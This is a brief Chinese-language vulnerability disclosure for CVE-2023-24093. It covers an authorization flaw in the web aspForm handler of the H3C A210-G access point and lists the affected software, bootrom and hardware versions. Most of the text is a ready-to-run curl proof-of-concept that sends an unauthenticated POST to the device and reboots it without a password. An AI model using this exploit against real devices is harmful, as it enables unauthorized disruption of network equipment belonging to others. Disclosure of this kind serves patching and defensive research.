# CVE-2023-24093 H3C A210-G接入点Web aspForm授权漏洞

## 漏洞细节

H3C A210-G设备存在漏洞，允许未经授权的用户在没有密码的情况下进行操作

产品名称:H3C A210-G

软件版本:A210-GV100R005

Bootrom版本:106

硬件版本: VER.A

重启路由器Exp(192.168.21.2):

```
curl -k -i --raw -X POST -d "CMD=Reboot_Router&GO=do_rst.asp&SET0=RebootRouter%%3D1&nowait=1&location_addr=http%%3A%%2F%%2F192.168.21.2%%2Fdevice_restart.asp" "http://192.168.21.2/goform/aspForm" -H "Origin: http://192.168.21.2" -H "Referer: http://192.168.21.2/device_restart.asp"
```
